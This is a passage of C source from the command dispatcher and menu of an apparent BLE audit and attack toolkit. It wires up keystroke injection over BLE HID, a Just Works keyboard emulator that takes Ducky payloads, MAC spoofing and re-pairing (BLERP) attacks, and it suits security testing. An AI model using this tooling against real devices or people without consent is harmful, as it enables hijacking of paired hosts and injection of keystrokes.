            uint8_t target_atype = BLEURP_BDADDR_LE_PUBLIC;
            char target_str[18] = "";
            char target_name[256] = "Inconnu";
            int8_t target_rssi = -100;

            if (target) {
                memcpy(target_addr, target->address, 6);
                target_atype = target->addr_type;
                target_rssi = target->rssi;
                snprintf(target_str, sizeof target_str, "%02X:%02X:%02X:%02X:%02X:%02X",
                         target_addr[5], target_addr[4], target_addr[3],
                         target_addr[2], target_addr[1], target_addr[0]);
                if (target->has_name && target->name[0]) {
                    snprintf(target_name, sizeof target_name, "%s", target->name);
                }
            } else if (n_bonds > 0) {
                parse_addr(bonded_list[0], target_addr);
                snprintf(target_str, sizeof target_str, "%s", bonded_list[0]);
                target_atype = BLEURP_BDADDR_LE_PUBLIC;
                snprintf(target_name, sizeof target_name, "Bond BlueZ");
            }

            struct smp_bond_info bond;
            struct smp_bond_info *pbond = (has_adapter && smp_bond_load(BLEURP_BLUEZ_STORE_DIR, adapter, target_str, &bond) == 0) ? &bond : NULL;

            bool authorized = false;
            if (is_suite_4) {
                authorized = run_blerp_all_4_tests(dev_id, target_addr, target_atype, target_str, target_name, target_rssi, pbond);
            } else {
                authorized = run_blerp_target_test(dev_id, attack_type, target_addr, target_atype, target_str, target_name, target_rssi, pbond);
            }

            if (authorized) {
                banner_print_success(stdout);
            } else {
                printf("\n  %s[-] Le re-pairing n'a pas été autorisé ou la connexion a échoué.%s\n", UI_RED, UI_RESET);
            }
        }
    }

    dev_table_free(&table);
    printf("\n(entree pour continuer) ");
    fflush(stdout);
    char b[8];
    (void)read_line(b, sizeof b);
}

static int cmd_keyboard(int argc, char **argv) {
    int dev_id = bleurp_hci_find_default_dev();
    const char *name = "BLEURP Keyboard";
    uint8_t auth = 0x01; // Bonding
    uint8_t keysize = 16;
    uint8_t iocap = 0x03; // NoInputNoOutput (Just Works)
    const char *payload = NULL;

    int opt;
    optind = 1;
    while ((opt = getopt(argc, argv, "i:n:a:k:o:d:h")) != -1) {
        switch (opt) {
            case 'i': {
                // Accept "hci1" as well as "1", matching the usage line.
                const char *num = (strncmp(optarg, "hci", 3) == 0) ? optarg + 3 : optarg;
                long idx;
                if (parse_long_arg(num, 10, 0, 255, &idx) < 0) {
                    fprintf(stderr, "keyboard: -i invalide '%s' (attendu hciN ou un index 0-255)\n", optarg);
                    return 1;
                }
                dev_id = (int)idx;
                break;
            }
            case 'n': name = optarg; break;
            case 'a': auth = (uint8_t)strtol(optarg, NULL, 0); break;
            case 'k': keysize = (uint8_t)strtol(optarg, NULL, 0); break;
            case 'o': iocap = (uint8_t)strtol(optarg, NULL, 0); break;
            case 'd': payload = optarg; break;
            case 'h':
            default:
                fprintf(stderr, "Usage: bleurp keyboard [-i hciX] [-n name] [-a authreq_hex] [-k keysize] [-o iocap] [-d payload.ducky]\n");
                return 1;
        }
    }

    struct peripheral_config cfg = {
        .dev_id = dev_id,
        .device_name = name,
        .io_capability = iocap,
        .auth_req = auth,
        .max_key_size = keysize,
        .trigger_sec_req = true,
        .payload_file = payload
    };

    return peripheral_keyboard_run(&cfg);
}

static int cmd_menu(void) {
    for (;;) {
        signal(SIGINT, SIG_DFL); // Ctrl-C at the menu exits
        printf("\033[2J\033[H");
        banner_print(stdout);
        printf("\n  %sBLE recon%s %s/%s%s attack toolkit%s\n",
               UI_PINK, UI_RESET, UI_PURPLE, UI_RESET, UI_PINK, UI_RESET);
        printf("  %s------------------------------------------------------------%s\n",
               UI_PURPLE, UI_RESET);
        printf("  %s[-0-]%s Suite Audit   %spipeline tout-en-un (Scan -> GATT -> SMP -> HID)%s\n",
               UI_GREEN, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-1-]%s Scan          %sdecouverte BLE en direct + fingerprint%s\n",
               UI_YELLOW, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-2-]%s Enum GATT     %sconnexion a un appareil, arbre GATT%s\n",
               UI_YELLOW, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-3-]%s HID Payload   %sinjection de frappes (BLE HID)%s\n",
               UI_YELLOW, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-4-]%s MAC Spoofer   %sadresse aleatoire statique (LE)%s\n",
               UI_YELLOW, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-5-]%s SMP Probe     %ssonde d'appairage native (HCI User Channel)%s\n",
               UI_YELLOW, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-6-]%s BLE Keyboard  %sémulateur clavier HID (HOGP Périphérique)%s\n",
               UI_YELLOW, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-7-]%s Re-pairing    %scheck de re-pairing sur un bond (BLERP)%s\n",
               UI_YELLOW, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-8-]%s Security Req  %stest Security Request sur un bond (BLERP)%s\n",
               UI_YELLOW, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-9-]%s Tout tester   %sscan, puis connexion + GATT sur chaque appareil%s\n",
               UI_ORANGE, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-A-]%s Audit complet %sscripts/audit_ble.sh : identification -> rapport%s\n",
               UI_GREEN, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-B-]%s BLERP Attack  %sattaques re-pairing (CI, PI, MitM, Audit NDSS 2026)%s\n",
               UI_GREEN, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-F-]%s Option Finale %sscan 15s, validation consentement, test re-pairing -> SUCCESS%s\n",
               UI_GREEN, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-Q-]%s Quitter%s\n\n> ", UI_PINK, UI_RESET, UI_RESET);
        fflush(stdout);

        char line[64];
        if (read_line(line, sizeof line) < 0) return 0;
        if (line[0] == 'q' || line[0] == 'Q') return 0;

        if (line[0] == '0') {
            menu_guided_audit_wizard();
        } else if (line[0] == '1') {
            menu_scan_wizard();
        } else if (line[0] == '2') {
            signal(SIGINT, SIG_DFL);
            printf("%sAddress%s (AA:BB:CC:DD:EE:FF): ", UI_PINK, UI_RESET);
            fflush(stdout);
            char a[64];
            if (read_line(a, sizeof a) == 0) {
                uint8_t addr[6];
                if (parse_addr(a, addr) == 0) {
                    printf("%sType%s (public/random) [public]: ", UI_PINK, UI_RESET);
                    fflush(stdout);
                    char t[16];
                    uint8_t at = BLEURP_BDADDR_LE_PUBLIC;
                    if (read_line(t, sizeof t) == 0 && strncmp(t, "random", 6) == 0) {
                        at = BLEURP_BDADDR_LE_RANDOM;
                    }
                    do_enum(addr, at);
                } else {
                    printf("invalid address\n");
                }
            }
            printf("\n(enter to continue) ");
            fflush(stdout);
            char b[8];
            (void)read_line(b, sizeof b);
        } else if (line[0] == '3') {
            run_hid_wizard(NULL);
        } else if (line[0] == '4') {
            menu_mac_spoofer();
        } else if (line[0] == '5') {
            menu_smp_wizard();
        } else if (line[0] == '6') {
            menu_keyboard_wizard();
        } else if (line[0] == '7') {
            menu_repair_wizard();
        } else if (line[0] == '8') {
            menu_secreq_wizard();
        } else if (line[0] == '9') {
            menu_autotry_wizard();
        } else if (line[0] == 'a' || line[0] == 'A') {
            menu_audit_script();
        } else if (line[0] == 'b' || line[0] == 'B') {
            menu_blerp_wizard();
        } else if (line[0] == 'f' || line[0] == 'F') {
            menu_finale_wizard(-1);
        }
    }
}

// Dispatch: subcommands, flags -> scan, otherwise the interactive menu.
int main(int argc, char **argv) {
    if (argc >= 2) {
        if (strcmp(argv[1], "wizard") == 0 ||
            strcmp(argv[1], "suite") == 0 ||
            strcmp(argv[1], "pipeline") == 0)   { menu_guided_audit_wizard(); return 0; }
        if (strcmp(argv[1], "finale") == 0) {
            int all = -1;
            if (argc >= 3 && (strcmp(argv[2], "--all-test") == 0 ||
                              strcmp(argv[2], "all-test") == 0 ||
                              strcmp(argv[2], "-a") == 0)) {
                all = 1;
            }
            menu_finale_wizard(all);
            return 0;
        }
        if (strcmp(argv[1], "enum") == 0)       return cmd_enum(argc - 1, argv + 1);
        if (strcmp(argv[1], "audit") == 0)      return cmd_audit(argc - 1, argv + 1);
        if (strcmp(argv[1], "read") == 0)       return cmd_read(argc - 1, argv + 1);
        if (strcmp(argv[1], "write") == 0)      return cmd_write(argc - 1, argv + 1);
        if (strcmp(argv[1], "hid") == 0)        return hid_cmd_run(argc - 1, argv + 1);
        if (strcmp(argv[1], "smp") == 0)        return cmd_smp_native(argc - 1, argv + 1);
        if (strcmp(argv[1], "repair") == 0)     return cmd_repair(argc - 1, argv + 1);
        if (strcmp(argv[1], "secreq") == 0)     return cmd_secreq(argc - 1, argv + 1);
        if (strcmp(argv[1], "blerp") == 0)      return cmd_blerp(argc - 1, argv + 1);
        if (strcmp(argv[1], "keyboard") == 0 ||
            strcmp(argv[1], "peripheral") == 0 ||
            strcmp(argv[1], "adv") == 0)        return cmd_keyboard(argc - 1, argv + 1);
        if (strcmp(argv[1], "scan") == 0)       return cmd_scan(argc - 1, argv + 1);
        if (strcmp(argv[1], "autotry") == 0)   return cmd_autotry(argc - 1, argv + 1);
        if (strcmp(argv[1], "menu") == 0)       return cmd_menu();
        if (argv[1][0] == '-')                  return cmd_scan(argc, argv); // back-compat
        usage(argv[0]);
        return 2;
    }
    return cmd_menu();
}
